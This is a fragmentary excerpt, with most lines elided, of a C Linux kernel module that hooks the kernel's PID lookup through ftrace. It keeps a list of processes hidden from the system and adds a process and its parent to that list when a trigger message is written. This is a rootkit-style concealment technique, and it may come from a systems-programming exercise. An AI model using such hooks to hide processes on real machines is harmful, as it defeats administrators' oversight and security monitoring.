...
MODULE_LICENSE("GPL");
MODULE_AUTHOR("asas1asas200@gmail.com");
...
{
    hook->address = (unsigned long)real_find_ge_pid;
    if (!hook->address) {
                                      ...
                                      struct ftrace_regs *fregs)
{
    ...
    if (!within_module(parent_ip, THIS_MODULE))
        fregs->regs.ip = (unsigned long) hook->func;
}
...
static long get_ppid_info(pid_t pid)
{
	...
	return task_ppid_nr(task);
}

static void clean_hidden(void)
{
	pid_node_t *proc, *tmp_proc;
	list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
...
static int hide_process(pid_t pid, pid_t ppid)
{
                            ...
                            loff_t *offset)
{
    ...
    if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
		...
		long ppid = get_ppid_info(pid);
        hide_process(pid, ppid);
